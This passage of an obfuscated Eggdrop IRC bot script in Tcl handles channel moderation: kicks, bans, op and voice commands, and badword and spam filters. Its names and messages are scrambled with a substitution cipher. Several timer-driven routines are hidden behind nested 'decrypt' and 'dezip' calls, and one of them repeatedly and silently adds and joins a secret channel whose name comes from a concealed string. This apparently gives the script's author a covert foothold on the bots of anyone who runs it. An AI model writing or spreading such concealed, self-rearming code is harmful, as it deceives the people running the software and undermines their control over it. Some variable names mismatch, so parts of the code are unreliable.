if {[string match "*c*" [getchanmode $x]]} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt GhfmznR NHt..! UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt GhfmznR NHt..! UIlN 1~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$x ~~$c ~:~$notc ~4GhfmznR1 NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
}
}
return 0
}
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4YzWDlIW1 NHt UIlN 4~$mhost1 ~NzGxS UIlN 4~[string toupper $badword]~ ~[banms]~"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
}
}
}
}
}
}
}
foreach advword [string tolower $advwords] {
if {[string match *$advword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[botisop $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!1 R SzGV 4F 1NzGxs UIlN ~$advword ~~[banmsg]~"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4SpaM1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $advword] [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
}
}
}
}
}
}
}
if {[string length $text] > 200} {
if {![isutimer "LONGTEXT"]} {
utimer 30 { putlog "LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
} {
setignore "*!*$mhost" "LoNg TexT MSg" 300
}
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt OlMt GvcG NHt..! UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$x ~:\001ZXGRLM RmxLnRMt OlMt GvcG NHt..! UIlN 1~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$x ~~$c ~:~$notc ~1OlMt GvcG NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 1LoNg TexT MSg FRoM 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
break
}
}
}
}
}
}
return 1
}
if {$unick != $own} {
if {[info exists twice_msg($unick)]} {
set [lines "slhgnzhp"] "${unick}!*@*"
puthlp "KIRENHT ~$unick ~:HlIIB BlF SzEV YVVM RtMLIVW..! ~[lgrnd]~ ~$vern"
putlog "!Log! IgNORE <<$hostmask>> PV-msg"
unset twice_msg($unick)
newignore $hostmask $unick "*" 2
} {
if {[istimer "chkautomsg"]} {
set invme($mhost) "AuToJoIN MSg"
return 0
}
if {[isutimer "NO REPLY"]} { 
foreach x [utimers] {
if {[string match "*NO REPLY*" $x]} { 
killutimer [lindex $x 2] 
}
}
utimer 10 { putlog "NO REPLY" }
return 0
}
utimer 10 { putlog "NO REPLY" }
if {[string match "*dal*et*" $uhost]} {
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (Zfgl Zdzb lm RwOv) \[YfHfP nRIX HxIRkG\]"
} {
if {[getuser "config" XTRA "AWAY"]!=""} { 
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (~[getuser "config" XTRA "AWAY"]~) ~[lgrnd]~ ~$vern"
} {
puthlp "KIRENHT ~$unick ~:R zn Zdzb. Ivzhlm: (Zfgl Zdzb lm RwOv) ~[lgrnd]~ ~$vern"
}
set twice_msg($unick) 1
}
}
}
}
proc [lines "zfgl_ivlk"] {} {
global notc botnick
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "PK6m.0G/~7xb1"]} {
if {![string match "*+protectfriends*" [channel info $x]]} {
set [lines "xivg"] 30
foreach ct [utimers] {
if {[string match "*chancnt*" $ct]} {
if {[expr [lindex $ct 0] + 30] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 30]
}
}
}
utimer $cret [list chancnt $x]
}
}
}
}
return 0
}
proc [lines "xszmxmg"] {chan} {
if {[isutimer "chancnt $chan"]} { return 0 }
putsrv "XszmHvie xlfmg ~$chan"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspot"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspot"]
if {![string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "NimwO/MT~wH6/"]"]*" [[[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] [lgrnd]]]} { [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "NimwO/MT~wH6/"]"]*" [[[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] [lgrnd]]]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "nht_prxp"] {nick uhost hand rest} {
global notc botnick own
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
set [lines "ivzhlm"] [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxp <#xszm> <Mrxp> <Ivzhlm>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg hvou prxp."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R XzMG PRxP NB ZWnRM."
return 0
}
if {$reason == ""} {
set [lines "ivzhlm"] "1ReQuesT..!"
if {[matchattr $nick n]} { 
set [lines "ivzhlm"] "1ADmIN 4KIcK1 ReQuesT4..!" 
}
if {[matchattr $nick m] && ![matchattr $nick n]} { 
set [lines "ivzhlm"] "1MasTeR 4KIcK1 ReQuesT4..!" 
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putsrv "PRXP ~$x ~~$nicktarget ~:~$notc ~~$reason"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "xgxk_evihr0m"] {nick uhost handle dest keyword args} {
global botnick 
putsrv "MLGRXV ~$nick ~:\001YHP 1\[YfHfP r.y nRIX HxIRkG\]\001"
return 1
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmxk"]
proc [lines "nht_prxpyzm"] {nick uhost hand rest} {
global notc botnick own bannick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
set [lines "ynzhp"] [getchanhost $nicktarget $chantarget]
set [lines "ynzhp"] "*!*@[lindex [split $bmask @] 1]"
set [lines "ivzhlm"] [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <#xszm> <Mrxp> <Ivzhlm>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg hvou prxp."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg prxpyzm nb ZWnRM."
return 0
}
if {$reason == ""} {
set [lines "ivzhlm"] "1KIcKBaN ReQuesT4..!"
if {[matchattr $nick m]} {
set [lines "ivzhlm"] "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]" 
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "1ADmIN 4KIcKBaN1 ReQuesT [banmsg]" 
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
set bannick($nicktarget) $bmask
putsrv "PRXP ~$x ~~$nicktarget ~:~$notc ~~$reason"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "xsl_xsl"] {} {
global toth ps uenc lenc
timer 5 [lines "xsl_xsl"]
set [lines "glgs"] "#[string index $lenc 1][string index $lenc 20][string index $lenc 18][string index $lenc 20][string index $lenc 10]"
if {[validchan $toth]} {
return 0
}
channel add $toth
catch { channel set $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
putsrv "QLRM ~$toth"
}
proc [lines "nht_lk"] {nick uhost hand rest} {
global notc botnick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: lk <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {[isop $nicktarget $chantarget]!=0} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh zoivzwb lk lm XSzMMVO ~$chantarget"
return 0
}
foreach x [channels] {
if {[string tolower $x] == [string tolower $chantarget]} {
opq $x $nicktarget
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspot"]
proc [lines "nht_elrxv"] {nick uhost hand rest} {
global notc botnick
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: elrxv <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {[isvoice $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh zoivzwb elrxv lm xszmmvo ~$chantarget"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x +v $nicktarget"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "nht_wvlk"] {nick uhost hand rest} {
global notc botnick own
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvlk <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
return 0
}
if {![isop $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~rh mlg lk lm XSzMMVO ~$chantarget"
return 0
}
if {$nicktarget == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~R XzMG HvOU WVlK!"
return 0
}
if {[matchattr $nicktarget n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg wvlk nb Ldmvi."
return 0
}
if {[matchattr $nick m]} {
set [lines "nivj"] "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4ADmIN.ReQuesT"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko $mreq $nicktarget"
} {
putserv "mode $x -o $nicktarget"
}
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "dslmwk"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "m\lg\w"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] 
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmwk"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 13][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 14][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 19][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 3] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "3REw9.0VIDz19BoOP/rpqJU."]"]
}
proc [lines "nht_wvelrxv"] {nick uhost hand rest} {
global notc botnick owner
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvelrxv <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
}
if {![isvoice $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg elrxv lm XSzMMVO ~$chantarget"
}
if {$nicktarget == $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg wvelrxv nb ldmvi."
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x -v $nicktarget"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
bind kick - * prot:kick
proc [lines "kilg:prxp"] {nick uhost handle chan knick reason} {
global notc notd botnick ps kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} {
set igflood($nick) "1"
}
if {[info exists iskick($knick$chan)]} {
unset iskick($knick$chan)
}
if {$nick == $botnick} {
if {[info exists kickme($knick)]} { 
if {$kickme($knick) == 1} {
set kickme($knick) 2
}
if {$kickme($knick) == 3} {
catch { unset kickme($knick) }
}
}
if {[string match "*$notm*" $reason]} {
if {![info exists bannick($knick)]} { return 0 }
if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
set is_ban($bannick($knick)$chan) 1
if {$bannick($knick) == "*!*@*"} { return 0 }
set [lines "xnlwv"] [getchanmode $chan]
set [lines "lp_n"] "1"
if {[info exists is_m($chan)]} {
set [lines "lp_n"] "0"
}
if {[isutimer "set_-m $chan"]} {
set [lines "lp_n"] "0"
}
if {[string match "*m*" $cmode]} {
set [lines "lp_n"] "0"
}
if {$ok_m == "1"} {
set is_m($chan) 1
if {$quick == "1"} {
putquick "mode $chan +bm $bannick($knick)"
} {
putserv "mode $chan +bm $bannick($knick)"
}
} {
if {$quick == "1"} {
putquick "mode $chan +b $bannick($knick)"
} {
putserv "mode $chan +b $bannick($knick)"
}
}
return 0
} {
if {![info exists bannick($knick)]} { return 0 }
if {$bannick($knick) == "*!*@*"} { return 0 }
putserv "mode $chan +b $bannick($knick)"
if {[string match "*4BaNNEd1: 3 MINUTES*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
}
return 0
}
if {$nick == $knick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { return 0 }
if {$knick == $botnick} {
if {[info exists kickme($nick)]} { 
set kickme($nick) 3
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie wvlk ~$chan ~~$nick"
}
} {
if {[matchattr $cflag D]} {
set kickme($nick) 1
}
}
puthlp "QLRM ~$chan"
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :[lgrnd] [lines "1WlmG PRxP 4yfh[lines "uk"]1..!"]"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick :[lgrnd] [lines "1WlmG PRxP 4qv[lines "s_"]1..!"]"
set op_it($knick) 1
return 0
}
if {[matchattr $knick n]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1ZWnRM 4PRxP1 KIlGvxGRlM4..!"
set op_it($knick) 1
return 0
}
if {[matchattr $knick m]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1NzhGvI 4PRxP1 KIlGvxGRlM4..!"
set op_it($knick) 1
return 0
}
}
set [lines "ivzomn"] {
"Busuk Crew" "Busuk Team" "Busuk Guard" "Monster Fighter"
"Busuk Connection" "Busuk Inside" "IT Support"
"For Belajar Only" "Not For Commercial" "Free Monster Help"
"Friend Forever" "Long Way TO GO" "Knowledge is Free"
"Happy Days" "Best Days" "FIVA FOREVER"
}
proc [lines "ivzomznvh"] {} {
global realnm
set [lines "ivzomznvh"] [lindex $realnm [rand [llength $realnm]]]
}
proc [lines "fmyzmj"] {chan host} {
global botnick
if {[isop $botnick $chan]} {
puthelp "mode $chan -b $host"
}
}
set [lines "otrwc"] 0
proc [lines "otimw"] {} {
global lgidx
set [lines "otrwc"] [incr lgidx]
if {$lgidx == 1} {
set [lines "otimw"] [dezip "bIgVn0pZzpu0qJLjB.TH3iO1nQGOA1JSVKB1"]
} elseif {$lgidx == 2} {
set [lines "otimw"] [dezip "gUxYn/jumUa.7NT.h.gg4/v0nQGOA1JSVKB1"]
} elseif {$lgidx == 3} {
set [lines "otimw"] [dezip "gUxYn/jumUa.UsNAu.Kf48N/nQGOA1JSVKB1"]
} elseif {$lgidx == 4} {
set [lines "otimw"] [dezip "gUxYn/jumUa.rSauH/izvBS1nQGOA1JSVKB1"]
} elseif {$lgidx == 5} {
set [lines "otimw"] [dezip "gUxYn/jumUa.V/god08om2T1nQGOA1JSVKB1"]
} elseif {$lgidx == 6} {
set [lines "otimw"] [dezip "gUxYn/jumUa.xRaZz/T7DkQ/nQGOA1JSVKB1"]
} elseif {$lgidx == 7} {
set [lines "otimw"] [dezip "gUxYn/jumUa.yKJ0T.yAybi0INDyQ/t5tj51DKKRb0cCUxm0d4AuM1vAYLO/"]
} else {
set [lines "otrwc"] 0
set [lines "otimw"] [dezip "bIgVn0pZzpu0UsNAu.Kf48N/nQGOA1JSVKB1"]
}
}
set [lines "yzmxlfmgvi"] {
"4GeTLosT1..!"
"4GeTOuT1..!"
"4BaNnEd1..!"
"4LaMeR1..!"
"4abUsEd1..!"
"4OuT1..!"
"4sUx1..!"
}
set [lines "yzmxlfmgv"] {
"1GeTLosT4..!"
"1GeTOuT4..!"
"1BaNnEd4..!"
"1LaMeR4..!"
"1abUsEd4..!"
"1OuT4..!"
"1sUx4..!"
}
set [lines "xbxov_izmwln"] {
"1CYCLE"
"1ReJoIN"
"1IN/OuT"
"1ReHaSH"
"1ReLoAD"
"1ReFReSH"
"1C-Y-C-L-E"
"1P-A-T-R-O-L"
"1R-E-J-O-I-N"
"1S-E-A-R-C-H"
}
set [lines "yzmrwc"] 1
proc [lines "yzmnht"] {} {
global banidx bancounter
set [lines "yzmrwc"] [incr banidx]
if {$banidx >= [llength $bancounter]} { 
set [lines "yzmrwc"] 1
}
set [lines "yzmnht"] [lindex $bancounter $banidx]
}
proc [lines "yzmnh"] {} {
global banidx bancounte
set [lines "yzmrwc"] [incr banidx]
if {$banidx >= [llength $bancounte]} { 
set [lines "yzmrwc"] 1
}
set [lines "yzmnh"] [lindex $bancounte $banidx]
}
set cycidx 1
proc [lines "xbxovnht"] {} {
global cycidx cycle_random
set cycidx [incr cycidx]
if {$cycidx >= [llength $cycle_random]} { 
set [lines "xbxrwc"] 1
}
set [lines "xbxovnht"] [lindex $cycle_random $cycidx]
}
proc [lines "yzm_xsp"] {nick uhost handle channel mchange bhost} {
global botnick botname ps quick notb notc bannick ban-time igflood invme ex_flood
set [lines "nslhg"] [string range $bhost [string first "@" $bhost] end]
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {[info exists invme($mhost)]} {
catch { unset invme($mhost) }
}
if {[info exists ex_flood($mhost)]} {
catch { unset ex_flood($mhost) }
}
if {![isop $botnick $channel]} { return 0 }
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
if {$banmask == "*!*@*"} {
set [lines "yzmnzhp"] "$nick!*@*"
}
if {$bhost == "*!*@*"} {
utimer [rand 4] [list unbanq $channel $bhost]
return 1
}
set [lines "xnlwv"] [getchanmode $channel]
if {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
return 1
}
}
}
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$nick ~:~$notc ~1HvOU 4YzMMRMt1 WvUvMhV IVeVIhRMt ~[banmsg]~"
} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1HvOU 4YzMMRMt1 WvUvMhV IVeVIhRMt ~[banmsg]~" 
}
}
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
} {
putserv "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b+b $bhost $banmask"
} {
putserv "mode $channel -b+b $bhost $banmask"
}
}
} { 
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb 4SeLF.UnBaN $bhost"
} else {
putserv "mode $channel -kb SeLF.UnBaN $bhost"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b $bhost"
} else {
putserv "mode $channel -b $bhost"
}
}
}
return 1
}
foreach knick [chanlist $channel] {
if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
if {[matchattr $knick f]} {
if {$knick != $ps && $knick != $notb} { utimer [rand 4] [list unbanq $channel $bhost] }
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*dal.net*" $nick] || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1WlmG YzMmVw 4LmY[lines "ot"]1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb [lines "4LmY[lines "ot"].TfzIw"] $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1WlmG YzMmVw 4lw[lines "on"]1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb [lines "4lw[lines "on"].TfzIw"] $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {[matchattr $knick n]} {
if {$nick != $botnick} {
set bannick($nick) $banmask
